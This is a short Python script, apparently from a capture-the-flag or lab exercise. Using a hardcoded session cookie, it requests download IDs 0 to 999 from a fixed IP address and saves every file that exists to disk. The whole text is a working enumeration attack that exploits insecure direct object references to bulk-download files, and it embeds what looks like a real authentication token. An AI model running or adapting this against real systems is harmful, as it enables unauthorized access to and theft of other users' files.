import requests

cookie = {
    'api-auth': 'MTYzNTU3MzkxNXxEdi1CQkFFQ180SUFBUkFCRUFBQUpmLUNBQUVHYzNSeWFXNW5EQThBRFdGMWRHaGxiblJwWTJGMFpXUUVZbTl2YkFJQ0FBRT18PWHDXujdDxtrbI8rANxNISdFeDQJ4JdD08BmxJckMIs='
}
url = 'http://130.193.45.70/download/'

for i in range(1000):
    r = requests.get(url + str(i), cookies=cookie)

    if r.content != b'File not found\n':
        print(f'Found {i}')
        with open(f'files/{i}', 'wb') as f:
            f.write(r.content)
